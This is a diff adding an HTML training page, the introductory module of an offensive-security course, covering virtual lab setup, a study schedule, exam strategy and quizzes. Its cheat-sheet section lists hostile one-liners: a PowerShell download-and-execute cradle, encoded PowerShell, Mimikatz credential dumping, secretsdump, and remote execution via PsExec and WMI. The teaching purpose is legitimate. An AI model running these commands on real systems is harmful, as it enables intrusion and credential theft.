+      <tr>
+        <td>VULNERABLE</td>
+        <td>After configuring vulnerable services</td>
+        <td>Repeat exploitation practice</td>
+      </tr>
+      <tr>
+        <td>POST-EXPLOIT</td>
+        <td>After successful exploitation</td>
+        <td>Practice post-exploitation without re-exploiting</td>
+      </tr>
+    </table>
+    <div class="tip-box">
+      <h5>💡 Snapshot Naming Convention</h5>
+      <p>Use: <code>YYYY-MM-DD_DESCRIPTION</code>. Example: <code>2026-06-29_BASE_Windows10</code>. You will have dozens of snapshots. Naming matters.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 5: VM SETUP -->
+  <h2>🔧 Section 5: VM Setup — Step by Step</h2>
+
+  <div class="method-card">
+    <h4>Kali Linux Attacker VM</h4>
+    <div class="code-block">
+=== KALI SETUP ===
+
+# 1. Import pre-built Kali VM into VirtualBox/VMware
+# 2. Start VM, login: kali / kali
+# 3. Update system
+sudo apt update && sudo apt full-upgrade -y
+
+# 4. Install essential tools
+sudo apt install -y \
+  bloodhound neo4j \
+  crackmapexec \
+  evil-winrm \
+  impacket-scripts \
+  powershell-empire \
+  remmina \
+  seclists \
+  sshuttle \
+  tmux
+
+# 5. Configure static IP (host-only network)
+sudo nano /etc/network/interfaces
+# Add:
+auto eth1
+iface eth1 inet static
+    address 192.168.56.10
+    netmask 255.255.255.0
+
+# 6. Enable IP forwarding (for pivoting labs)
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+# 7. Take snapshot: BASE_KALI_2026-06-29
+    </div>
+  </div>
+
+  <div class="method-card">
+    <h4>Windows 10/11 Target VM</h4>
+    <div class="code-block">
+=== WINDOWS TARGET SETUP ===
+
+# 1. Create new VM from Windows 10/11 ISO
+# 2. During install, choose "Custom" and create single partition
+# 3. When prompted for Microsoft account, choose "Domain join instead"
+#    Create local user: operator / Operator123!
+
+# 4. After first boot, disable Windows Update (for stability)
+#    Settings → Update & Security → Advanced options → Pause updates
+
+# 5. Disable Windows Defender (for malware labs)
+#    Settings → Update & Security → Windows Security → 
+#    Virus & threat protection → Manage settings → 
+#    Turn OFF: Real-time protection, Cloud-delivered protection, 
+#              Automatic sample submission, Tamper protection
+
+# 6. Disable Firewall (for initial networking labs)
+#    Control Panel → Windows Defender Firewall → 
+#    Turn Windows Defender Firewall on or off → 
+#    Turn OFF for both private and public networks
+
+# 7. Enable Remote Desktop (for lateral movement labs)
+#    Settings → System → Remote Desktop → Enable Remote Desktop
+
+# 8. Install common tools
+#    - Chrome (for browser exploitation)
+#    - Python 3 (for custom scripts)
+#    - Visual Studio Build Tools (for compiling C/C++)
+#    - Git for Windows (for cloning repos)
+
+# 9. Configure static IP (host-only network)
+#    Settings → Network & Internet → Ethernet → 
+#    Change adapter options → Properties → IPv4 →
+#    IP: 192.168.56.11
+#    Subnet: 255.255.255.0
+#    Gateway: 192.168.56.1
+
+# 10. Take snapshot: BASE_WINDOWS_2026-06-29
+    </div>
+    <div class="warning-box">
+      <h5>⚠️ Security Warning</h5>
+      <p>This VM is intentionally vulnerable. Never connect it to the internet. Never use it for personal browsing. Isolate it to host-only networking only.</p>
+    </div>
+  </div>
+
+  <div class="method-card">
+    <h4>Windows Server 2022 (Domain Controller)</h4>
+    <div class="code-block">
+=== DOMAIN CONTROLLER SETUP ===
+
+# 1. Install Windows Server 2022 from ISO
+# 2. Choose "Windows Server 2022 Standard Evaluation (Desktop Experience)"
+# 3. Set Administrator password: P@ssw0rd123!
+
+# 4. Configure static IP
+#    IP: 192.168.56.20
+#    Subnet: 255.255.255.0
+#    DNS: 127.0.0.1 (it will be the DC)
+
+# 5. Install Active Directory Domain Services
+#    Server Manager → Manage → Add Roles and Features →
+#    Role-based installation → Select server →
+#    Check "Active Directory Domain Services" → Install
+
+# 6. Promote to Domain Controller
+#    Server Manager → AD DS (yellow flag) → 
+#    "Promote this server to a domain controller" →
+#    Add new forest → Root domain name: 22sd.local →
+#    DSRM password: P@ssw0rd123! → Next → Install
+#    (Server will reboot automatically)
+
+# 7. Create domain users (for Module 19 labs)
+#    Active Directory Users and Computers → 22sd.local →
+#    New → User → Create test users:
+#      - gwu07 (domain admin candidate)
+#      - jsoldier (standard user)
+#      - svc_sql (service account)
+
+# 8. Take snapshot: BASE_DC_2026-06-29
+    </div>
+    <p><strong>Cross-link:</strong> Full AD exploitation in <a href="MODULE_19_AD.html" class="cross-link">Module 19: Active Directory</a>.</p>
+  </div>
+
+  <!-- SECTION 6: NETWORKING LAB MACHINES -->
+  <h2>🌐 Section 6: Networking Lab Machines</h2>
+
+  <div class="method-card">
+    <h4>Virtual Network Modes Explained</h4>
+    <table>
+      <tr>
+        <th>Mode</th>
+        <th>VM ↔ Host</th>
+        <th>VM ↔ Internet</th>
+        <th>VM ↔ VM</th>
+        <th>Use Case</th>
+      </tr>
+      <tr>
+        <td>NAT</td>
+        <td>Yes</td>
+        <td>Yes</td>
+        <td>No</td>
+        <td>VM needs internet, isolated from others</td>
+      </tr>
+      <tr>
+        <td>Host-Only</td>
+        <td>Yes</td>
+        <td>No</td>
+        <td>Yes</td>
+        <td>Lab network — VMs talk, no internet</td>
+      </tr>
+      <tr>
+        <td>Bridged</td>
+        <td>Yes</td>
+        <td>Yes</td>
+        <td>Yes</td>
+        <td>VM appears as real machine on network</td>
+      </tr>
+      <tr>
+        <td>Internal</td>
+        <td>No</td>
+        <td>No</td>
+        <td>Yes</td>
+        <td>Air-gapped lab, no host access</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="step-box">
+    <h4>Recommended Lab Network Topology</h4>
+    <div class="lab-diagram">
+      <div class="lab-node attacker">KALI<br>192.168.56.10<br>NAT + Host-Only</div>
+      <div class="lab-arrow">→</div>
+      <div class="lab-node router">vboxnet0<br>192.168.56.0/24<br>Host-Only</div>
+      <div class="lab-arrow">→</div>
+      <div class="lab-node target">WINDOWS 10<br>192.168.56.11<br>Host-Only</div>
+      <div class="lab-arrow">→</div>
+      <div class="lab-node target">WINDOWS 11<br>192.168.56.12<br>Host-Only</div>
+      <div class="lab-arrow">→</div>
+      <div class="lab-node target">DC 2022<br>192.168.56.20<br>Host-Only</div>
+    </div>
+    <p style="margin-top: 1rem;">Kali has <strong>two adapters</strong>: NAT (for internet access) and Host-Only (for lab communication). Targets have only Host-Only. They cannot reach the internet.</p>
+  </div>
+
+  <div class="step-box">
+    <h4>VirtualBox Network Configuration</h4>
+    <div class="code-block">
+=== VIRTUALBOX NETWORK SETUP ===
+
+# 1. Create Host-Only Network
+File → Host Network Manager → Create
+Name: vboxnet0
+IPv4 Address: 192.168.56.1
+IPv4 Mask: 255.255.255.0
+DHCP Server: DISABLED (we use static IPs)
+
+# 2. Configure Kali VM
+Settings → Network → Adapter 1: NAT (for internet)
+Settings → Network → Adapter 2: Host-Only Adapter → vboxnet0
+
+# 3. Configure Windows Targets
+Settings → Network → Adapter 1: Host-Only Adapter → vboxnet0
+
+# 4. Verify connectivity from Kali
+ping 192.168.56.11    # Windows 10 target
+ping 192.168.56.12    # Windows 11 target
+ping 192.168.56.20    # Domain Controller
+
+# 5. Verify from Windows targets
+ping 192.168.56.10    # Kali attacker
+# Should succeed (same network)
+
+ping 8.8.8.8          # Google DNS
+# Should FAIL (targets have no internet — correct)
+    </div>
+  </div>
+
+  <div class="step-box">
+    <h4>VMware Network Configuration</h4>
+    <div class="code-block">
+=== VMWARE NETWORK SETUP ===
+
+# 1. Edit → Virtual Network Editor
+# 2. Select VMnet1 (Host-only) → Change Settings
+#    Subnet IP: 192.168.56.0
+#    Subnet Mask: 255.255.255.0
+#    DHCP Settings: DISABLED
+# 3. Select VMnet8 (NAT) → NAT Settings
+#    Subnet IP: 192.168.88.0 (different range!)
+#    Gateway: 192.168.88.2
+
+# 4. Configure Kali VM
+#    Network Adapter 1: NAT (VMnet8)
+#    Network Adapter 2: Host-only (VMnet1)
+
+# 5. Configure Windows Targets
+#    Network Adapter 1: Host-only (VMnet1)
+
+# 6. Verify connectivity (same as VirtualBox)
+    </div>
+  </div>
+
+  <div class="tip-box">
+    <h5>💡 Troubleshooting Network Issues</h5>
+    <p>If pings fail:</p>
+    <ul style="margin-left: 1.5rem; line-height: 1.8;">
+      <li>Check Windows Firewall — is it disabled?</li>
+      <li>Check IP configuration — static IP set correctly?</li>
+      <li>Check VirtualBox/VMware network editor — subnet correct?</li>
+      <li>Check adapter order in VM — is Host-Only first?</li>
+      <li>Restart VM — network adapters sometimes need a reboot</li>
+    </ul>
+  </div>
+
+  <!-- SECTION 7: STUDY SCHEDULE -->
+  <h2>📅 Section 7: Study Schedule</h2>
+
+  <div class="method-card">
+    <h4>The 22-Week Sprint</h4>
+    <p>This course is designed for <span class="neon-highlight">one module per week</span> at 15-20 hours/week. Adjust based on your experience.</p>
+  </div>
+
+  <div class="schedule-grid">
+    <div class="schedule-card">
+      <h4><span class="week">Week 1:</span> Module 00 — Reader & Lab Build</h4>
+      <p>Build lab. Verify networking. No exploitation yet.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 2:</span> Module 01 — Networking</h4>
+      <p>TCP/IP, Wireshark, packet analysis. Cross-link to Module 02.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 3:</span> Module 02 — Reconnaissance</h4>
+      <p>Nmap, OSINT, footprinting. Build recon script.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 4:</span> Module 03 — PowerShell</h4>
+      <p>Windows automation, download cradles, obfuscation.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 5:</span> Module 04 — Shell Scripting</h4>
+      <p>Bash, Python, automation. Build tool chain.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 6:</span> Module 05 — Exploitation</h4>
+      <p>Buffer overflows, web exploits, Metasploit basics.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 7:</span> Module 06 — Memory Forensics</h4>
+      <p>Volatility, memory dumps, process analysis.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 8:</span> Module 07 — Web Attacks</h4>
+      <p>SQLi, XSS, CSRF, IDOR. DVWA practice.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 9:</span> Module 08 — Privilege Escalation</h4>
+      <p>Windows & Linux privesc. Token abuse, kernel exploits.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 10:</span> Module 09 — Malware Development</h4>
+      <p>Shellcode, encoders, packers. Build custom payload.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 11:</span> Module 10 — Code Injection</h4>
+      <p>DLL injection, process hollowing, reflective DLL.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 12:</span> Module 11 — Rootkits</h4>
+      <p>User-mode and kernel-mode rootkits. Hooking, hiding.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 13:</span> Module 12 — Defensive Verification</h4>
+      <p>EDR, SIEM, detection engineering. Blue team perspective.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 14:</span> Module 13 — EDR Evasion</h4>
+      <p>AMSI bypass, ETW bypass, unhooking. Red team skills.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 15:</span> Module 14 — Cloud Files</h4>
+      <p>Azure, AWS, GCP exploitation. Storage, IAM, containers.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 16:</span> Module 15 — Lateral Movement</h4>
+      <p>Pass-the-hash, WMI, PSExec, RDP hijacking.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 17:</span> Module 16 — C2 Frameworks</h4>
+      <p>Cobalt Strike, Sliver, Mythic. Build C2 infrastructure.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 18:</span> Module 17 — Data Exfiltration</h4>
+      <p>DNS tunneling, HTTPS exfil, steganography.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 19:</span> Module 18 — Social Engineering</h4>
+      <p>Phishing, pretexting, vishing. Build phishing campaign.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 20:</span> Module 19 — Active Directory</h4>
+      <p>BloodHound, Kerberoasting, DCSync, Golden Ticket.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 21:</span> Module 20 — Advanced Topics</h4>
+      <p>Hardware attacks, supply chain, physical security.</p>
+    </div>
+    <div class="schedule-card">
+      <h4><span class="week">Week 22:</span> Module 21-22 — Capstone & Exam</h4>
+      <p>Full-chain attack. Report writing. Final exam.</p>
+    </div>
+  </div>
+
+  <div class="tip-box">
+    <h5>💡 The 2-Day Rule</h5>
+    <p>Never miss two days in a row. One day off is rest. Two days off is a habit breaking. If you miss a day, the next day is non-negotiable.</p>
+  </div>
+
+  <div class="step-box">
+    <h4>Daily Study Block (2-3 Hours)</h4>
+    <table>
+      <tr>
+        <th>Time</th>
+        <th>Activity</th>
+        <th>Purpose</th>
+      </tr>
+      <tr>
+        <td>0:00 — 0:15</td>
+        <td>Review yesterday's notes</td>
+        <td>Spaced repetition</td>
+      </tr>
+      <tr>
+        <td>0:15 — 0:45</td>
+        <td>Read new material</td>
+        <td>Theory absorption</td>
+      </tr>
+      <tr>
+        <td>0:45 — 1:45</td>
+        <td>Lab / hands-on</td>
+        <td>Muscle memory</td>
+      </tr>
+      <tr>
+        <td>1:45 — 2:15</td>
+        <td>Troubleshoot & document</td>
+        <td>Problem solving</td>
+      </tr>
+      <tr>
+        <td>2:15 — 2:30</td>
+        <td>Write cheat sheet entry</td>
+        <td>Synthesis</td>
+      </tr>
+      <tr>
+        <td>2:30 — 3:00</td>
+        <td>Quiz / self-test</td>
+        <td>Verification</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- SECTION 8: EXAM PREPARATION -->
+  <h2>🎯 Section 8: Exam Preparation</h2>
+
+  <div class="first-principle">
+    <h3>🧠 The Core Truth</h3>
+    <p>The exam is not a test of memory. It is a test of <span class="neon-highlight">execution under pressure</span>. You will be given a target network. You will have a time limit. You must chain techniques from multiple modules to achieve the objective. Your notes are your only reference.</p>
+  </div>
+
+  <div class="method-card">
+    <h4>Exam Format</h4>
+    <table>
+      <tr>
+        <th>Component</th>
+        <th>Details</th>
+      </tr>
+      <tr>
+        <td>Duration</td>
+        <td>24 hours (split into two 12-hour blocks)</td>
+      </tr>
+      <tr>
+        <td>Target Network</td>
+        <td>3-5 machines (Windows, Linux, mixed)</td>
+      </tr>
+      <tr>
+        <td>Objectives</td>
+        <td>Flags on each machine + domain admin compromise</td>
+      </tr>
+      <tr>
+        <td>Deliverables</td>
+        <td>Flags + professional report (72 hours after exam)</td>
+      </tr>
+      <tr>
+        <td>Passing Score</td>
+        <td>70% of flags + satisfactory report</td>
+      </tr>
+      <tr>
+        <td>Allowed Materials</td>
+        <td>Your notes, your cheat sheets, your tools</td>
+      </tr>
+      <tr>
+        <td>Prohibited</td>
+        <td>Internet, AI assistance, outside help, automated scanners</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="step-box">
+    <h4>30-Day Exam Prep Plan</h4>
+    <table>
+      <tr>
+        <th>Period</th>
+        <th>Focus</th>
+        <th>Daily Hours</th>
+      </tr>
+      <tr>
+        <td>Days 1-10</td>
+        <td>Review all modules. Rebuild key techniques from scratch. Update cheat sheets.</td>
+        <td>3-4</td>
+      </tr>
+      <tr>
+        <td>Days 11-20</td>
+        <td>Practice exams. Timed drills. Full-chain attacks on lab network.</td>
+        <td>4-5</td>
+      </tr>
+      <tr>
+        <td>Days 21-25</td>
+        <td>Weak area focus. Re-do failed labs. Drill problem techniques.</td>
+        <td>3-4</td>
+      </tr>
+      <tr>
+        <td>Days 26-28</td>
+        <td>Light review. Organize notes. Rest. Sleep.</td>
+        <td>1-2</td>
+      </tr>
+      <tr>
+        <td>Day 29</td>
+        <td>Exam day block 1 (12 hours). No cramming. Trust your preparation.</td>
+        <td>12</td>
+      </tr>
+      <tr>
+        <td>Day 30</td>
+        <td>Exam day block 2 (12 hours) if needed. Report writing begins.</td>
+        <td>12</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="step-box">
+    <h4>Exam Day Strategy</h4>
+    <ol style="margin-left: 1.5rem; line-height: 2;">
+      <li><strong>Recon first (30 min):</strong> Map the network. Nmap all targets. Document everything. Don't attack yet.</li>
+      <li><strong>Low-hanging fruit (1-2 hours):</strong> Attack the easiest target first. Build momentum. Get a flag early.</li>
+      <li><strong>Chain from foothold (2-4 hours):</strong> Use initial access for recon. Pivot. Escalate. Move laterally.</li>
+      <li><strong>Domain compromise (4-6 hours):</strong> If AD is present, this is the big prize. Use BloodHound. Find paths.</li>
+      <li><strong>Clean up & verify (1 hour):</strong> Screenshot every flag. Verify every compromise. You cannot go back.</li>
+      <li><strong>Report outline (30 min):</strong> Before time expires, outline your report. Note what you did, what worked, what failed.</li>
+    </ol>
+    <div class="warning-box">
+      <h5>⚠️ Time Management Warning</h5>
+      <p>If you're stuck on a technique for more than 2 hours, move on. The exam is designed to have multiple paths. Don't get tunnel vision. Save every rung — if one path fails, you need another.</p>
+    </div>
+  </div>
+
+  <div class="tip-box">
+    <h5>💡 The Screenshot Rule</h5>
+    <p>Screenshot <strong>everything</strong>. Every command. Every output. Every flag. Your report is graded on evidence. A flag without a screenshot is a flag you cannot prove.</p>
+  </div>
+
+  <!-- SECTION 9: CHEAT SHEET CONSTRUCTION -->
+  <h2>📋 Section 9: Cheat Sheet Construction</h2>
+
+  <div class="method-card">
+    <h4>The One-Page Rule</h4>
+    <p>Every technique gets one page. No exceptions. If it doesn't fit, you don't know it well enough. Your cheat sheets are your lifeline during the exam.</p>
+  </div>
+
+  <div class="cheat-sheet-grid">
+    <div class="cheat-card">
+      <h4>Reconnaissance (Module 02)</h4>
+      <code>nmap -sV -sC -O target</code>
+      <code>nmap -p- --min-rate 1000 target</code>
+      <code>enum4linux -a target</code>
+      <code>dig axfr @target domain.com</code>
+    </div>
+    <div class="cheat-card">
+      <h4>PowerShell (Module 03)</h4>
+      <code>IEX(New-Object Net.WebClient).DownloadString('url')</code>
+      <code>powershell -enc [base64]</code>
+      <code>Get-Process | ?{$_.ProcessName -like '*av*'}</code>
+      <code>Invoke-Expression $cmd</code>
+    </div>
+    <div class="cheat-card">
+      <h4>Privilege Escalation (Module 08)</h4>
+      <code>whoami /priv</code>
+      <code>winPEAS.exe</code>
+      <code>PowerUp.ps1</code>
+      <code>SharpUp.exe</code>
+      <code>TokenPrivileges | SeImpersonate</code>
+    </div>
+    <div class="cheat-card">
+      <h4>Code Injection (Module 10)</h4>
+      <code>OpenProcess → VirtualAllocEx</code>
+      <code>WriteProcessMemory → CreateRemoteThread</code>
+      <code>Process Hollowing: svchost.exe</code>
+      <code>APC: QueueUserAPC (no Event ID 8)</code>
+    </div>
+    <div class="cheat-card">
+      <h4>Lateral Movement (Module 15)</h4>
+      <code>Invoke-Mimikatz -DumpCreds</code>
+      <code>Invoke-PsExec -Computer target -Command cmd</code>
+      <code>Invoke-WMIExec -Target target -Command cmd</code>
+      <code>xfreerdp /v:target /u:user /p:pass</code>
+    </div>
+    <div class="cheat-card">
+      <h4>Active Directory (Module 19)</h4>
+      <code>bloodhound-python -u user -p pass -d domain -c All</code>
+      <code>GetNPUsers.py domain/user -no-pass</code>
+      <code>secretsdump.py domain/user@target</code>
+      <code>golden_ticket = krbtgt hash + domain SID</code>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <h4>Cheat Sheet Template</h4>
+    <div class="code-block">
+=== CHEAT SHEET: [TECHNIQUE NAME] ===
+
+PURPOSE:
+  One line: what this does and when to use it.
+
+PREREQUISITES:
+  - Required privileges
+  - Required tools
+  - Required network access
+
+COMMANDS:
+  [Command 1]    # What it does
+  [Command 2]    # What it does
+  [Command 3]    # What it does
+
+EVIDENCE / CLEANUP:
+  - What the defender sees
+  - How to remove artifacts
+  - How to verify success
+
+COMMON FAILURES:
+  - Failure 1 → Fix 1
+  - Failure 2 → Fix 2
+
+CROSS-LINKS:
+  - Module X (prerequisite)
+  - Module Y (follow-up)
+  - Module Z (evasion)
+
+LAST TESTED: YYYY-MM-DD on [TARGET]
+STATUS: Working / Broken / Needs Update
+    </div>
+  </div>
+
+  <div class="tip-box">
+    <h5>💡 The Printer Test</h5>
+    <p>Print your cheat sheets. Can you read them at 2 AM under red light? If the font is too small or the colors don't print, fix it. Your exam environment may not have a second monitor.</p>
+  </div>
+
+  <!-- SECTION 10: MENTOR'S ADVICE -->
+  <h2>🎖️ Section 10: Mentor's Advice</h2>
+
+  <div class="mentor-quote">
+    <p>"The best operators are not the ones who know the most techniques. They are the ones who know <span class="neon-highlight">which technique to use when everything else fails</span>. Save every rung. Build redundancy. If your first payload is caught, your second should already be staged."</p>
+    <p class="author">— Senior Operator, 22nd Survey Division</p>
+  </div>
+
+  <div class="mentor-quote">
+    <p>"You will fail labs. You will crash VMs. You will spend 6 hours on a technique that doesn't work. This is not wasted time. This is <span class="neon-amber">the education</span>. Every failure teaches you what the defender sees. Every crash teaches you stability. Every dead end teaches you patience."</p>
+    <p class="author">— Lab Instructor, 22nd Survey Division</p>
+  </div>
+
+  <div class="mentor-quote">
+    <p>"Your notes are your legacy. Write them as if you are training your replacement. Because someday, you will be training your replacement. And they will ask the same questions you asked. Make your notes answer those questions before they are asked."</p>
+    <p class="author">— Course Designer, 22nd Survey Division</p>
+  </div>
+
+  <div class="step-box">
+    <h4>The 10 Commandments of the 22nd Survey Division</h4>
+    <ol style="margin-left: 1.5rem; line-height: 2;">
+      <li><strong>Thou shalt build the lab first.</strong> No lab, no learning. No exceptions.</li>
+      <li><strong>Thou shalt execute every command.</strong> Reading is not doing. Doing is learning.</li>
+      <li><strong>Thou shalt take screenshots of everything.</strong> Evidence is truth. Truth is graded.</li>
+      <li><strong>Thou shalt not skip modules.</strong> The course is a chain. Break one link, the chain fails.</li>
+      <li><strong>Thou shalt write cheat sheets.</strong> One page per technique. No exceptions.</li>
+      <li><strong>Thou shalt follow cross-links.</strong> Techniques are a web, not a list. Understand the web.</li>
+      <li><strong>Thou shalt fail in the lab.</strong> Better to fail in the lab than in the exam. Better to fail in the exam than in the field.</li>
+      <li><strong>Thou shalt not use AI during exams.</strong> Your brain is the weapon. Sharpen it.</li>
+      <li><strong>Thou shalt teach what thou learnest.</strong> Teaching reveals gaps. Gaps are opportunities.</li>
+      <li><strong>Thou shalt save every rung.</strong> Redundancy is survival. Always have a second path.</li>
+    </ol>
+  </div>
+
+  <div class="warning-box">
+    <h5>⚠️ Final Warning</h5>
+    <p>This course teaches offensive techniques for <span class="neon-highlight">authorized testing and defense</span>. Using these techniques without explicit written authorization is illegal in almost every jurisdiction. The 22nd Survey Division trains operators, not criminals. Know the law. Know your boundaries. Operate ethically.</p>
+  </div>
+
+  <!-- SECTION 11: CROSS-LINKS TO KEY MODULES -->
+  <h2>🔗 Section 11: Cross-Links to Key Modules</h2>
+
+  <div class="method-card">
+    <h4>Where to Go From Here</h4>
+    <p>This module is your foundation. The next modules build on it. Here are the critical paths:</p>
+    <div class="cheat-sheet-grid">
+      <div class="cheat-card">
+        <h4>Foundation Path</h4>
+        <p><a href="MODULE_01.html" class="cross-link">Module 01: Networking</a></p>
+        <p><a href="MODULE_02.html" class="cross-link">Module 02: Reconnaissance</a></p>
+        <p><a href="MODULE_03.html" class="cross-link">Module 03: PowerShell</a></p>
+        <p><a href="MODULE_04.html" class="cross-link">Module 04: Shell Scripting</a></p>
+      </div>
+      <div class="cheat-card">
+        <h4>Execution Path</h4>
+        <p><a href="MODULE_05.html" class="cross-link">Module 05: Exploitation</a></p>
+        <p><a href="MODULE_06.html" class="cross-link">Module 06: Memory Forensics</a></p>
+        <p><a href="MODULE_07.html" class="cross-link">Module 07: Web Attacks</a></p>
+        <p><a href="MODULE_08.html" class="cross-link">Module 08: Privilege Escalation</a></p>
+        <p><a href="MODULE_09.html" class="cross-link">Module 09: Malware Development</a></p>
+      </div>
+      <div class="cheat-card">
+        <h4>Persistence Path</h4>
+        <p><a href="MODULE_10.html" class="cross-link">Module 10: Code Injection</a></p>
+        <p><a href="MODULE_11.html" class="cross-link">Module 11: Rootkits</a></p>
+        <p><a href="MODULE_12.html" class="cross-link">Module 12: Defensive Verification</a></p>
+        <p><a href="MODULE_13.html" class="cross-link">Module 13: EDR Evasion</a></p>
+        <p><a href="MODULE_14.html" class="cross-link">Module 14: Cloud Files</a></p>
+      </div>
+      <div class="cheat-card">
+        <h4>Operations Path</h4>
+        <p><a href="MODULE_15.html" class="cross-link">Module 15: Lateral Movement</a></p>
+        <p><a href="MODULE_16.html" class="cross-link">Module 16: C2 Frameworks</a></p>
+        <p><a href="MODULE_17.html" class="cross-link">Module 17: Data Exfiltration</a></p>
+        <p><a href="MODULE_18.html" class="cross-link">Module 18: Social Engineering</a></p>
+        <p><a href="MODULE_19.html" class="cross-link">Module 19: Active Directory</a></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 12: INTERACTIVE QUIZZES -->
+  <h2>🧪 Section 12: Interactive Quizzes</h2>
+
+  <div class="quiz-container" id="quiz-1">
+    <h4>Question 1: What is the FIRST step before starting Module 01?</h4>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+      A) Read all 22 modules to understand the big picture
+    </div>
+    <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+      B) Build the lab environment and verify networking
+    </div>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+      C) Memorize all PowerShell one-liners from Module 03
+    </div>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+      D) Install every tool from Kali Linux repositories
+    </div>
+    <div class="quiz-feedback" id="feedback-quiz-1"></div>
+  </div>
+
+  <div class="quiz-container" id="quiz-2">
+    <h4>Question 2: Why are snapshots essential in a lab environment?</h4>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+      A) They improve VM performance by freeing memory
+    </div>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+      B) They allow multiple VMs to share the same disk
+    </div>
+    <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+      C) They let you revert to a clean state after malware infections or crashes
+    </div>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+      D) They are required for host-only networking to work
+    </div>
+    <div class="quiz-feedback" id="feedback-quiz-2"></div>
+  </div>
+
+  <div class="quiz-container" id="quiz-3">
+    <h4>Question 3: What is the "One-Page Rule" for cheat sheets?</h4>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+      A) Every cheat sheet must be printed on a single physical page
+    </div>
+    <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+      B) If a technique doesn't fit on one page, you don't understand it well enough
+    </div>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+      C) Cheat sheets are limited to one page per module
+    </div>
+    <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+      D) Only one cheat sheet is allowed during the exam
+    </div>
+    <div class="quiz-feedback" id="feedback-quiz-3"></div>
+  </div>
+
+  <!-- FINAL NAVIGATION -->
+  <div class="nav" style="margin-top: 2rem;">
+    <a href="../index.html">← Home</a>
     <a href="MODULE_01.html">Module 01 →</a>
   </div>
 </div>
+
+<script>
+  // Copy buttons for code blocks
+  document.querySelectorAll('.code-block').forEach(block => {
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.textContent = 'COPY';
+    btn.addEventListener('click', () => {
+      const text = block.textContent.replace('COPY', '').trim();
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'COPIED!';
+        setTimeout(() => btn.textContent = 'COPY', 2000);
+      });
+    });
+    block.appendChild(btn);
+  });
+
+  // Quiz functionality
+  function checkAnswer(option, quizId) {
+    const container = document.getElementById(quizId);
+    const options = container.querySelectorAll('.quiz-option');
+    const feedback = document.getElementById('feedback-' + quizId);
+    
+    // Disable all options
+    options.forEach(opt => {
+      opt.style.pointerEvents = 'none';
+      if (opt.dataset.correct === 'true') {
+        opt.classList.add('correct');
+      } else if (opt === option) {
+        opt.classList.add('wrong');
+      }
+    });
+    
+    // Show feedback
+    feedback.classList.add('show');
+    if (option.dataset.correct === 'true') {
+      feedback.classList.add('correct');
+      feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+    } else {
+      feedback.classList.add('wrong');
+      feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+    }
+  }
+
+  function getExplanation(quizId, isCorrect) {
+    const explanations = {
+      'quiz-1': 'Module 00 explicitly states: "Build it before you touch Module 01." The lab environment is the foundation for all hands-on learning. Without it, you cannot execute the techniques.',
+      'quiz-2': 'Snapshots are time machines for VMs. After you infect a target with malware or crash it during a kernel exploit, you revert to the snapshot instead of rebuilding the VM from scratch.',
+      'quiz-3': 'The One-Page Rule forces synthesis. If you cannot distill a technique to one page, you have not mastered it. This constraint ensures your cheat sheets are usable under exam pressure.'
+    };
+    return explanations[quizId] || 'Keep studying!';
+  }
+</script>
 
 </body>
 </html>
